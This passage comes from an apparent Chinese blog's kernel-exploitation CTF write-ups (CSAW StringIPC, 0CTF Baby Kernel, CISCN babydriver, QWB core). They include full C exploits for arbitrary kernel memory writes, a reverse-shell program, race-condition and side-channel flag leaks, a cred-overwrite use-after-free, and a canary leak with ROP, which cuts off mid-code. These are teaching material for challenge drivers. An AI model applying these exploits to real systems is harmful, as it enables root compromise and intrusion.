&lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;sys/auxv.h&gt;#define CSAW_IOCTL_BASE 0x77617363#define CSAW_ALLOC_CHANNEL CSAW_IOCTL_BASE + 1#define CSAW_OPEN_CHANNEL CSAW_IOCTL_BASE + 2#define CSAW_GROW_CHANNEL CSAW_IOCTL_BASE + 3#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE + 4#define CSAW_READ_CHANNEL CSAW_IOCTL_BASE + 5#define CSAW_WRITE_CHANNEL CSAW_IOCTL_BASE + 6#define CSAW_SEEK_CHANNEL CSAW_IOCTL_BASE + 7#define CSAW_CLOSE_CHANNEL CSAW_IOCTL_BASE + 8struct alloc_channel_args&#123;\tsize_t buf_size;\tint id;&#125;;struct open_channel_args&#123;\tint id;&#125;;struct shrink_channel_args&#123;\tint id;\tsize_t size;&#125;;struct read_channel_args&#123;\tint id;\tchar *buf;\tsize_t count;&#125;;struct write_channel_args&#123;\tint id;\tchar *buf;\tsize_t count;&#125;;struct seek_channel_args&#123;\tint id;\tlong int index;\tint whence;&#125;;struct close_channel_args&#123;\tint id;&#125;;void print_hex(char *buf, size_t len)&#123;\tint i;\tfor (i = 0; i &lt; ((len / 8) * 8); i += 8)\t&#123;\t\tprintf(&quot;0x%lx&quot;, *(size_t *)(buf + i));\t\tif (i % 16)\t\t\tprintf(&quot; &quot;);\t\telse\t\t\tprintf(&quot;\\n&quot;);\t&#125;&#125;void show_vdso_userspace(int len)&#123;\tsize_t addr = 0;\taddr = getauxval(AT_SYSINFO_EHDR);\tif (addr &lt; 0)\t&#123;\t\tputs(&quot;[-]cannot get vdso addr&quot;);\t\treturn;\t&#125;\tfor (int i = len; i &lt; 0x1000; i++)\t&#123;\t\tprintf(&quot;%x &quot;, *(char *)(addr + i));\t&#125;&#125;int check_vsdo_shellcode(char *shellcode)&#123;\tsize_t addr = 0;\taddr = getauxval(AT_SYSINFO_EHDR);\tprintf(&quot;vdso:%lx\\n&quot;, addr);\tif (addr &lt; 0)\t&#123;\t\tputs(&quot;[-]cannot get vdso addr&quot;);\t\treturn 0;\t&#125;\tif (memmem((char *)addr, 0x1000, shellcode, strlen(shellcode)))\t&#123;\t\treturn 1;\t&#125;\treturn 0;&#125;int get_gettimeofday_str_offset()&#123;\tsize_t vdso_addr = getauxval(AT_SYSINFO_EHDR);\tchar *name = &quot;gettimeofday&quot;;\tif (!vdso_addr)\t&#123;\t\tprintf(&quot;[-]error get name&#x27;s offset&quot;);\t&#125;\tsize_t name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));\tif (name_addr &lt; 0)\t&#123;\t\tprintf(&quot;[-]error get name&#x27;s offset&quot;);\t&#125;\treturn name_addr - vdso_addr;&#125;int main()&#123;\tint fd = -1;\tsize_t result = 0;\tstruct alloc_channel_args alloc_args;\tstruct shrink_channel_args shrink_args;\tstruct seek_channel_args seek_args;\tstruct read_channel_args read_args;\tstruct close_channel_args close_args;\tstruct write_channel_args write_args;\tsize_t addr = 0xffffffff80000000;\tsize_t real_cred = 0;\tsize_t cred = 0;\tsize_t target_addr;\tsize_t kernel_base = 0;\tsize_t selinux_disable_addr = 0x2C7BA0;\tsize_t prctl_hook = 0x124FD00;\tsize_t order_cmd = 0x123D1E0;\tsize_t poweroff_work_func_addr = 0x9C4C0;\tint root_cred[12];\tint offset;\toffset = get_gettimeofday_str_offset();\tprintf(&quot;gettimeofday str in vdso.so offset=0x%x\\n&quot;, offset);\tsetvbuf(stdout, 0LL, 2, 0LL);\tchar *buf = malloc(0x1000);\tchar target[16];\tstrcpy(target, &quot;trytofind196082&quot;);\tfd = open(&quot;/proc/simp1e&quot;, O_RDWR);\tif (fd &lt; 0)\t&#123;\t\tputs(&quot;[-] open error&quot;);\t\texit(-1);\t&#125;\talloc_args.buf_size = 0x100;\talloc_args.id = -1;\tioctl(fd, CSAW_ALLOC_CHANNEL, &amp;alloc_args);\tif (alloc_args.id == -1)\t&#123;\t\tputs(&quot;[-] alloc_channel error&quot;);\t\texit(-1);\t&#125;\tprintf(&quot;[+] now we get a channel %d\\n&quot;, alloc_args.id);\tshrink_args.id = alloc_args.id;\tshrink_args.size = 0x100 + 1;\tioctl(fd, CSAW_SHRINK_CHANNEL, &amp;shrink_args);\tputs(&quot;[+] we can read and write any momery&quot;);\tfor (; addr &lt; 0xffffffffffffefff; addr += 0x1000)\t&#123;\t\tseek_args.id = alloc_args.id;\t\tseek_args.index = addr - 0x10;\t\tseek_args.whence = SEEK_SET;\t\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\t\tread_args.id = alloc_args.id;\t\tread_args.buf = buf;\t\tread_args.count = 0x1000;\t\tioctl(fd, CSAW_READ_CHANNEL, &amp;read_args);\t\tif ((!strcmp(&quot;gettimeofday&quot;, buf + offset)))\t\t&#123;\t\t\tresult = addr;\t\t\tprintf(&quot;[+] found vdso %lx\\n&quot;, result);\t\t\tbreak;\t\t&#125;\t&#125;\tif (result == 0)\t&#123;\t\tputs(&quot;not found , try again &quot;);\t\texit(-1);\t&#125;\tkernel_base = addr - 0x1020000;\tprctl_hook += kernel_base;\torder_cmd += kernel_base;\tpoweroff_work_func_addr += kernel_base;\tprintf(&quot;[+] found kernel base: %lx\\n&quot;, kernel_base);\tprintf(&quot;[+] found prctl_hook: %lx\\n&quot;, prctl_hook);\tprintf(&quot;[+] found order_cmd : %lx\\n&quot;, order_cmd);\tprintf(&quot;[+] found poweroff_work_func_addr: %lx\\n&quot;, poweroff_work_func_addr);\tioctl(fd, CSAW_CLOSE_CHANNEL, &amp;close_args);\tmemset(buf, &#x27;\\0&#x27;, 0x1000);\tstrcpy(buf, &quot;/reverse_shell\\0&quot;);\tseek_args.id = alloc_args.id;\tseek_args.index = order_cmd - 0x10;\tseek_args.whence = SEEK_SET;\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\twrite_args.id = alloc_args.id;\twrite_args.buf = buf;\twrite_args.count = strlen(buf) + 1;\tioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);\tmemset(buf, &#x27;\\0&#x27;, 0x1000);\tseek_args.id = alloc_args.id;\tseek_args.index = order_cmd + 13 - 0x10;\tseek_args.whence = SEEK_SET;\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\twrite_args.id = alloc_args.id;\twrite_args.buf = buf;\twrite_args.count = 1;\tioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);\tmemset(buf, &#x27;\\0&#x27;, 0x1000);\t*(size_t *)buf = poweroff_work_func_addr;\tseek_args.id = alloc_args.id;\tseek_args.index = prctl_hook - 0x10;\tseek_args.whence = SEEK_SET;\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\twrite_args.id = alloc_args.id;\twrite_args.buf = buf;\twrite_args.count = 20 + 1;\tioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);\tif (fork() == 0)\t&#123;\t\tprctl(addr, 2, addr, addr, 2);\t\texit(-1);\t&#125;\tsystem(&quot;nc -l -p 4444&quot;);\treturn 0;&#125;\n\n反弹shell程序：\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;char server_ip[] = &quot;127.0.0.1&quot;;uint32_t server_port = 4444;int main()&#123;    int sock = socket(AF_INET, SOCK_STREAM, 0);    struct sockaddr_in attacker_addr = &#123;0&#125;;    attacker_addr.sin_family = AF_INET;    attacker_addr.sin_port = htons(server_port);    attacker_addr.sin_addr.s_addr = inet_addr(server_ip);    while (connect(sock, (struct sockaddr *)&amp;attacker_addr, sizeof(attacker_addr)) != 0)        ;    dup2(sock, 0);    dup2(sock, 1);    dup2(sock, 2);    system(&quot;/bin/sh&quot;);&#125;\n\n题目链接：https://github.com/196082/196082\n\n参考链接：http://p4nda.top/2018/11/07/stringipc/#3-HijackPrctl\n","categories":["kernel-pwn"],"tags":["HijackPrctl"]},{"title":"kernel pwn基础[2]","url":"/2022/03/24/kernel-pwn%E5%9F%BA%E7%A1%80-2/","content":"2018 0CTF Finals Baby Kernel这次题目的附件只有驱动和文件系统没有bzImage\ntcdy@arch-linux ..study_kernel/2018_0CTFFinalsBabyKernel % strings baby.ko | grep vermagic=vermagic=4.15.0-22-generic SMP mod_unload\n\ntcdy@196082:~/Desktop/download/study_kernel$ sudo apt download linux-image-4.15.0-22-generic Get:1 https://mirrors.ustc.edu.cn/ubuntu bionic-updates/main amd64 linux-image-4.15.0-22-generic amd64 4.15.0-22.24 [7,875 kB]Fetched 7,875 kB in 1s (5,913 kB/s)tcdy@196082:~/Desktop/download/study_kernel$ ar x linux-image-4.15.0-22-generic_4.15.0-22.24_amd64.debtcdy@196082:~/Desktop/download/study_kernel$ tar -xf data.tar.xztcdy@196082:~/Desktop/download/study_kernel$ cd boot/tcdy@196082:~/Desktop/download/study_kernel/boot$ file vmlinuz-4.15.0-22-generic vmlinuz-4.15.0-22-generic: Linux kernel x86 boot executable bzImage, version 4.15.0-22-generic (buildd@lgw01-amd64-013) #24-Ubuntu SMP Wed May 16 12:15:17 UTC 2018, RO-rootFS, swap_dev 0x7, Normal VGA\n\n分析驱动__int64 __fastcall baby_ioctl(__int64 a1, __int64 a2)&#123;  __int64 v2; // rdx  int i; // [rsp-5Ch] [rbp-5Ch]  __int64 v5; // [rsp-58h] [rbp-58h]  _fentry__(a1, a2);  v5 = v2;  if ( (_DWORD)a2 == 0x6666 )  &#123;    printk(&quot;Your flag is at %px! But I don&#x27;t think you know it&#x27;s content\\n&quot;, flag);    return 0LL;  &#125;  else if ( (_DWORD)a2 == 0x1337         &amp;&amp; (unsigned __int8)_chk_range_not_ok(v2, 16LL, *(_QWORD *)(__readgsqword((unsigned int)&amp;current_task) + 4952)) != 1         &amp;&amp; (unsigned __int8)_chk_range_not_ok(                               *(_QWORD *)v5,                               *(int *)(v5 + 8),                               *(_QWORD *)(__readgsqword((unsigned int)&amp;current_task) + 4952)) != 1         &amp;&amp; *(_DWORD *)(v5 + 8) == strlen(flag) )  &#123;    for ( i = 0; i &lt; strlen(flag); ++i )    &#123;      if ( *(_BYTE *)(*(_QWORD *)v5 + i) != flag[i] )        return 22LL;    &#125;    printk(&quot;Looks like the flag is not a secret anymore. So here is it %s\\n&quot;, flag);    return 0LL;  &#125;  else  &#123;    return 14LL;  &#125;&#125;\n\n首先可以看到函数分为两部分，第一部分就是打印出flag的地址，第二部分则是经过两次检验之后进入下面的逐字节对比。\nbool __fastcall _chk_range_not_ok(__int64 a1, __int64 a2, unsigned __int64 a3)&#123;  bool v3; // cf  unsigned __int64 v4; // rdi  v3 = __CFADD__(a2, a1);  v4 = a2 + a1;  return v3 || a3 &lt; v4;&#125;\n\n这个验证函数些许看不懂，直接看汇编好一点\n.text:0000000000000000 55                            push    rbp.text:0000000000000001 48 01 F7                      add     rdi, rsi.text:0000000000000004 48 89 E5                      mov     rbp, rsp.text:0000000000000007 72 08                         jb      short loc_11.text:0000000000000007.text:0000000000000009 48 39 FA                      cmp     rdx, rdi.text:000000000000000C 0F 92 C0                      setb    al.text:000000000000000F 5D                            pop     rbp.text:0000000000000010 C3                            retn.text:0000000000000010.text:0000000000000011                               ; -----------------------------------------------------------------------.text:0000000000000011.text:0000000000000011                               loc_11:                    ; CODE XREF: __chk_range_not_ok+7↑j.text:0000000000000011 B8 01 00 00 00                mov     eax, 1.text:0000000000000016 5D                            pop     rbp.text:0000000000000017 C3                            retn\n\n就是第一个参数和第二个参数的和必须小于第三个参数\n&amp;&amp; (unsigned __int8)_chk_range_not_ok(v2, 16LL, *(_QWORD *)(__readgsqword((unsigned int)&amp;current_task) + 4952)) != 1    &amp;&amp; (unsigned __int8)_chk_range_not_ok(    *(_QWORD *)v5,    *(int *)(v5 + 8),    *(_QWORD *)(__readgsqword((unsigned int)&amp;current_task) + 4952)) != 1\n\n\n可以看到这里其实就是看看传入的参数是否是用户态\n这道提分为两种利用方式，这里都提一下(毕竟我都还不会)\nDouble Fetch这一利用方式可以看做是条件竞争，这里是两次验证，第一次验证是否为用户态，第二次逐字检查flag，那么要是在第一检查结束后将地址换成正真的flag地址，那么后一个验证即可绕过\n#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;fcntl.h&gt;#include &lt;pthread.h&gt;int finished = 0;int Time = 1000;size_t flag_addr;struct fake_flag&#123;    size_t *addr;    size_t size;&#125;;void change_flag_addr(void *s)&#123;    struct fake_flag *a = s;    while (finished == 0)    &#123;        a-&gt;addr = flag_addr;    &#125;&#125;int main(argc, argv)&#123;    setvbuf(stdin, 0, 2, 0);    setvbuf(stdout, 0, 2, 0);    setvbuf(stderr, 0, 2, 0);    struct fake_flag target;    int fd = open(&quot;/dev/baby&quot;, 0);    ioctl(fd, 0x6666);    system(&quot;dmesg &gt; record.txt&quot;);    int flag_addr_fd = open(&quot;./record.txt&quot;, O_RDONLY);    char buf[0x1000] = &#123;0&#125;;    lseek(flag_addr_fd, -0x1000, SEEK_END);    read(flag_addr_fd, buf, sizeof(buf));    close(flag_addr_fd);    char *idx;    idx = strstr(buf, &quot;Your flag is at &quot;);    flag_addr = strtoull(idx + 16, idx + 32, 16);    printf(&quot;[*]flag addr=&gt;%p\\n&quot;, flag_addr);    target.addr = buf;    target.size = 33;    pthread_t thread;    pthread_create(&amp;thread, NULL, change_flag_addr, &amp;target);    for (int i = 0; i &lt; Time; i++)    &#123;        ioctl(fd, 0x1337, &amp;target);        target.addr = buf;    &#125;    finished = 1;    pthread_join(thread, NULL);    close(fd);    puts(&quot;[+]result is :&quot;);    system(&quot;dmesg | grep flag&quot;);&#125;\n\n侧信道攻击名字虽然听起来很高端，实际干的事情就是爆破每一个字节。\n方法的原理就是：创建三个段，除了中间的段可读可写外，其他段的权限都为000，那么我们将flag放到第二个段的末尾，然后将猜测的字符放到最后一个，当最后一个字符不正确的时候就会直接退出，但是当最后一个字符正确的时候就会因为权限问题报错，并且系统崩溃\n\n#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;pthread.h&gt;#include &lt;sys/mman.h&gt;int main()&#123;    char *ch = &quot;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890,._-&quot;;    char flag[0x30] = &#123;0&#125;;    char command[0x100] = &#123;0&#125;;    char command1[0x100] = &#123;0&#125;;    FILE *fd = fopen(&quot;save.txt&quot;, &quot;r&quot;);    fscanf(fd, &quot;%s&quot;, flag);    fclose(fd);    for (int i = 0; i &lt; strlen(ch); i++)    &#123;        sprintf(command, &quot;echo \\&quot;%s%c\\&quot; &gt; save.txt&quot;, flag, ch[i]);        sprintf(command1, &quot;./exp %s%c&quot;, flag, ch[i]);        system(command);        system(command1);    &#125;&#125;\n\n#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;pthread.h&gt;#include &lt;sys/mman.h&gt;struct flag&#123;    size_t addr;    size_t size;&#125;;main(int argc, char *argv[])&#123;    char *buf;    mmap(0, 0x1000, PROT_NONE, MAP_SHARED | MAP_ANONYMOUS, 0, 0);    buf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, 0, 0);    mmap(0, 0x1000, PROT_NONE, MAP_SHARED | MAP_ANONYMOUS, 0, 0);    for (int i = 0; i &lt; strlen(argv[1]); i++)    &#123;        buf[0x1000 - strlen(argv[1]) + i] = argv[1][i];    &#125;    printf(&quot;[*]flag=&gt;%s\\n&quot;, argv[1]);    struct flag target;    target.size = 33;    target.addr = buf + 0x1000 - strlen(argv[1]);    int fd = open(&quot;/dev/baby&quot;, O_RDWR);    ioctl(fd, 0x1337, &amp;target);    close(fd);&#125;\n\n","categories":["kernel-pwn"],"tags":["Double Fetch","侧信道攻击"]},{"title":"kernel pwn基础","url":"/2022/03/21/kernel-pwn%E5%9F%BA%E7%A1%80/","content":"在学习kernel pwn我就是完全跟着wiki走的\nCISCN2017 - babydriver前置首先题目一般是会给我们三个文件，bzImage，boot.sh，rootfs.cpio\nboot.sh：启动kernel的shell脚本\nbzImage：kernel binary\nrootfs.cpio：文件系统\n这里要看文件系统的话需要先改变尾缀为gz，然后gunzip rootfs.cpio.gz，最后再cpio -idmv &lt; rootfs.cpio\n~/download/study_kernel/core ls                                                 bin  etc  home  init  lib  linuxrc  proc  rootfs.cpio  sbin  sys  tmp  usr\n\n接下来查看init文件\n~/download/study_kernel/core cat ./init -n                                          1\t#!/bin/sh     2\t      3\tmount -t proc none /proc     4\tmount -t sysfs none /sys     5\tmount -t devtmpfs devtmpfs /dev     6\tchown root:root flag     7\tchmod 400 flag     8\texec 0&lt;/dev/console     9\texec 1&gt;/dev/console    10\texec 2&gt;/dev/console    11\t    12\tinsmod /lib/modules/4.4.72/babydriver.ko    13\tchmod 777 /dev/babydev    14\techo -e &quot;\\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\\n&quot;    15\tsetsid cttyhack setuidgid 1000 sh    16\t    17\tumount /proc    18\tumount /sys    19\tpoweroff -d 0  -f    20\n\n可以看到在12行的时候加入一个驱动文件，一般这就是漏洞LKM。拿到驱动文件开始分析\n分析代码\n首先可以看到除了堆栈不可执行其余保护都是没开的\n\n首先在ida可以看到这一结构体\n再看babyioctl函数：\n__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)&#123;  size_t v3; // rdx  size_t v4; // rbx  _fentry__(filp, command, arg);  v4 = v3;  if ( command == 0x10001 )  &#123;    kfree(babydev_struct.device_buf);    babydev_struct.device_buf = _kmalloc(v4, 0x24000C0LL);    babydev_struct.device_buf_len = v4;    printk(&quot;alloc done\\n&quot;, 0x24000C0LL);    return 0LL;  &#125;  else  &#123;    printk(&amp;unk_2EB, v3);    return -22LL;  &#125;&#125;\n\n可以看到，这里在command为0x10001时，会先free掉以前的chunk，随后malloc一个我们给他的size的chunk。\nbabyopen:\nint __fastcall babyopen(inode *inode, file *filp)&#123;  _fentry__(inode, filp);  babydev_struct.device_buf = kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 0x40LL);  babydev_struct.device_buf_len = 64LL;  printk(&quot;device open\\n&quot;, 0x24000C0LL);  return 0;&#125;\n\n这里就会生成一个size为0x40的chunk\nbabyrelease:\nint __fastcall babyrelease(inode *inode, file *filp)&#123;  _fentry__(inode, filp);  kfree(babydev_struct.device_buf);  printk(&quot;device release\\n&quot;, filp);  return 0;&#125;\n\n这里会释放掉结构体所储存的chunk指针。\nbabyread:\nssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)&#123;  size_t v4; // rdx  ssize_t result; // rax  ssize_t v6; // rbx  _fentry__(filp, buffer);  if ( !babydev_struct.device_buf )    return -1LL;  result = -2LL;  if ( babydev_struct.device_buf_len &gt; v4 )  &#123;    v6 = v4;    copy_to_user(buffer);    return v6;  &#125;  return result;&#125;\n\n这里就是如果我们传入的size小于储存的size即可实行copy_to_user。\nbabywrite:\nssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)&#123;  size_t v4; // rdx  ssize_t result; // rax  ssize_t v6; // rbx  _fentry__(filp, buffer);  if ( !babydev_struct.device_buf )    return -1LL;  result = -2LL;  if ( babydev_struct.device_buf_len &gt; v4 )  &#123;    v6 = v4;    copy_from_user();    return v6;  &#125;  return result;&#125;\n\n这里和上面的验证一样。\n解题思路这里可以看到不存在任何溢出，但是这里跟传统用户态不同的是这里的全局变量是整个系统中全局的。那意思就是这里是存在UAF漏洞的。\n所以基本思路就是：\n 1. 首先打开两次设备，更改chunk size为cred结构体的size\n 2. 释放其中一个，这时就会出现0xa8的空白，那么我们fork一个新的进程，就会让进程的cred结构体占据那一空间\n 3. 我们还可以通过另一文件描述符修改掉内部的值，提权到root\n\n综上得出exp：\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;// #include &lt;stropts.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/stat.h&gt;int main()&#123;    int fd1 = open(&quot;/dev/babydev&quot;, 2);    int fd2 = open(&quot;/dev/babydev&quot;, 2);    ioctl(fd1, 0x10001, 0xa8);    close(fd1);    int pid = fork();    if (pid &lt; 0)    &#123;        puts(&quot;[*] error!&quot;);        exit(0);    &#125;    else if (pid == 0)    &#123;        char payload[30] = &#123;0&#125;;        write(fd2, payload, sizeof(payload));        if (getuid() == 0)        &#123;            puts(&quot;[+] root now!&quot;);            system(&quot;/bin/sh&quot;);            exit(0);        &#125;    &#125;    else    &#123;        wait(NULL);    &#125;    close(fd2);&#125;\n\n最后使用gcc静态编译打包进文件系统就好了\ngcc exploit.c -static -o exploitcp exploit core/tmp find . | cpio -o --format=newc &gt; rootfs.cpiocp rootfs.cpio ..\n\n2018 强网杯 - core这道题目的文件多了一个vmlinux，是未经过压缩的kernel文件，不过根据我的实践发现不能直接在题目给的vmlinux提取gedget，可以通过extract-vmlinux提取vmlinux来获取再用Ropper来提取。\n一样的先看一下start.sh\ntcdy@arch-linux ~/Downloads/study_kernel % cat -n start.sh      1\tqemu-system-x86_64 \\     2\t-m 256M \\     3\t-kernel ./bzImage \\     4\t-initrd  ./core.cpio \\     5\t-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \\     6\t-s  \\     7\t-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\     8\t-nographic  \\\n\n可以看到在第五行里面开启了kaslr，这一保护类似与aslr，需要泄漏地址才能获取gadget的地址。\n再看一下init文件\ntcdy@arch-linux ~/Downloads/study_kernel/core % cat -n init      1\t#!/bin/sh     2\tmount -t proc proc /proc     3\tmount -t sysfs sysfs /sys     4\tmount -t devtmpfs none /dev     5\t/sbin/mdev -s     6\tmkdir -p /dev/pts     7\tmount -vt devpts -o gid=4,mode=620 none /dev/pts     8\tchmod 666 /dev/ptmx     9\tcat /proc/kallsyms &gt; /tmp/kallsyms    10\techo 1 &gt; /proc/sys/kernel/kptr_restrict    11\techo 1 &gt; /proc/sys/kernel/dmesg_restrict    12\tifconfig eth0 up    13\tudhcpc -i eth0    14\tifconfig eth0 10.0.2.15 netmask 255.255.255.0    15\troute add default gw 10.0.2.2     16\tinsmod /core.ko    17\t    18\t#poweroff -d 120 -f &amp;    19\tsetsid /bin/cttyhack setuidgid 1000 /bin/sh    20\techo &#x27;sh end!\\n&#x27;    21\tumount /proc    22\tumount /sys    23\t    24\tpoweroff -d 0  -f\n\n可以看到第9行里面，系统将/proc/kallsyms放到了/tmp目录，然后又将kptr_restrict和dmesg_restrict设置为1，就不能通过/proc/kallsyms查看函数地址，以及用dmesg来查看kernel信息了。\n随后看一下驱动文件的保护：\n\n(这篇文章居然跟着我换个系统，哈哈哈哈哈！)\n分析驱动__int64 init_module()&#123;  core_proc = proc_create(&quot;core&quot;, 438LL, 0LL, &amp;core_fops);  printk(&quot;\\x016core: created /proc/core entry\\n&quot;);  return 0LL;&#125;\n\n看一下可以看到注册到了/proc/core\n__int64 __fastcall core_ioctl(__int64 a1, int a2, __int64 a3)&#123;  switch ( a2 )  &#123;    case 0x6677889B:      core_read(a3);      break;    case 0x6677889C:      printk(&amp;unk_2CD);      off = a3;      break;    case 0x6677889A:      printk(&amp;unk_2B3);      core_copy_func(a3);      break;  &#125;  return 0LL;&#125;\n\ncore_ioctl函数可以看到十三个选项，分别看一下\nunsigned __int64 __fastcall core_read(__int64 a1)&#123;  char *v2; // rdi  __int64 i; // rcx  unsigned __int64 result; // rax  char v5[64]; // [rsp+0h] [rbp-50h] BYREF  unsigned __int64 v6; // [rsp+40h] [rbp-10h]  v6 = __readgsqword(0x28u);  printk(&amp;unk_25B);  printk(&amp;unk_275);  v2 = v5;  for ( i = 16LL; i; --i )  &#123;    *v2 = 0;    v2 += 4;  &#125;  strcpy(v5, &quot;Welcome to the QWB CTF challenge.\\n&quot;);  result = copy_to_user(a1, &amp;v5[off], 64LL);  if ( !result )    return __readgsqword(0x28u) ^ v6;  __asm &#123; swapgs &#125;  return result;&#125;\n\n第一个core_read在最后做了一件事，就是吧v5[off]的值给到了我们的a1，然而这里的a1又是上一级a3，所以我们使用ioctl函数的第三个参数可以接收到这一值\ncase 0x6677889C:      printk(&amp;unk_2CD);      off = a3;      break;\n\n这里第二个选项可以看到我们还可以随意的修改off，所以我们可以这一方式泄漏出一些值，比如canary\n__int64 __fastcall core_copy_func(__int64 a1)&#123;  __int64 result; // rax  _QWORD v2[10]; // [rsp+0h] [rbp-50h] BYREF  v2[8] = __readgsqword(0x28u);  printk(&amp;unk_215);  if ( a1 &gt; 63 )  &#123;    printk(&amp;unk_2A1);    return 0xFFFFFFFFLL;  &#125;  else  &#123;    result = 0LL;    qmemcpy(v2, &amp;name, (unsigned __int16)a1);  &#125;  return result;&#125;\n\n然后第三个选项里可以看到将name全局变量复制到v2里，并且可以看到在获取参数时的数据类型为int64但是在qmemcpy函数内使用的却是unsigned int16，如果我们传入的是0xffffffffffff0100就可以造成栈溢出。\n__int64 __fastcall core_write(__int64 a1, __int64 a2, unsigned __int64 a3)&#123;  printk(&amp;unk_215);  if ( a3 &lt;= 0x800 &amp;&amp; !copy_from_user(&amp;name, a2, a3) )    return (unsigned int)a3;  printk(&amp;unk_230);  return 4294967282LL;&#125;\n\n并且在write函数我们还可以控制全局变量name的内容。\n解题思路 1. 通过设置off，使用core_read()泄漏出canary\n 2. 通过core_write()修改name的值，构造rop链\n 3. 通过core_copy_func()实现栈溢出，进行rop\n 4. 返回用户态通过system(&quot;/bin/sh&quot;);获得root shell\n\n在这里需要注意的是在进入内核之前会保存用户态的各种寄存器，所以在最后还要恢复各种寄存器。这里看一下push保存寄存器的操作：\npushq  $__USER_DS      /* pt_regs-&gt;ss */pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs-&gt;sp */pushq  %r11             /* pt_regs-&gt;flags */pushq  $__USER_CS      /* pt_regs-&gt;cs */pushq  %rcx             /* pt_regs-&gt;ip */\n\n由于我们会进行ROP，在结束时rsp的值会变动，所以我们就需要自己构造一些值来保证能够正常恢复到用户态。\nvoid save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;\n\n可以看到上面只有四个被保存了，因为最后我们希望rip跳转到system(“/bin/sh”);的地址，所以我们只需要好好构造好栈数据即可。\nexp#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/ioctl.h&gt;size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;size_t raw_vmlinux_base = 0xffffffff81000000;size_t commit_creds = 0, prepare_kernel_cred = 0, vmlinux_base = 0;void find_symbols()&#123;    FILE *file = fopen(&quot;/tmp/kallsyms&quot;, &quot;r&quot;);    if (file &lt; 0)    &#123;        puts(&quot;[*]open kallsyms error!&quot;);        exit(0);    &#125;    char buf[0x30] = &#123;0&#125;;    while (fgets(buf, 0x30, file))    &#123;        if (commit_creds &amp; prepare_kernel_cred)            return;        if (strstr(buf, &quot;commit_creds&quot;) &amp;&amp; !commit_creds)        &#123;            char hex[20] = &#123;0&#125;;            strncpy(hex, buf, 16);            sscanf(hex, &quot;%llx&quot;, &amp;commit_creds);            printf(&quot;commit_creds addr: %p\\n&quot;, commit_creds);            vmlinux_base = commit_creds - 0x9c8e0;            printf(&quot;vmlinux_base addr: %p\\n&quot;, vmlinux_base);        &#125;        if (strstr(buf, &quot;prepare_kernel_cred&quot;) &amp;&amp; !prepare_kernel_cred)        &#123;            char hex[20] = &#123;0&#125;;            strncpy(hex, buf, 16);            sscanf(hex, &quot;%llx&quot;, &amp;prepare_kernel_cred);            printf(&quot;prepare_kernel_cred addr: %p\\n&quot;, prepare_kernel_cred);        &#125;    &#125;    if (!(prepare_kernel_cred &amp; commit_creds))    &#123;        puts(&quot;[*]Error!&quot;);        exit(0);    &#125;&#125;void get_root()&#123;    if (!getuid())    &#123;        puts(&quot;[*] root now!&quot;);        system(&quot;/bin/sh&quot;);    &#125;    else    &#123;        puts(&quot;[*]spawn shell error!&quot;);    &#125;    exit(0);&#125;int main()&#123;    save_status();    int fd = open(&quot;/proc/core&quot;, 2);    if (fd &lt; 0)    &#123;        puts(&quot;[*]open /proc/core error!&quot;);        exit(0);    &#125;    find_symbols();    ssize_t offset = vmlinux_base - raw_vmlinux_base;    ioctl(fd, 0x6677889C, 0x40);    char buf[0x30] = &#123;0&#125;;    ioctl(fd, 0x6677889B, buf);    size_t canary = ((size_t 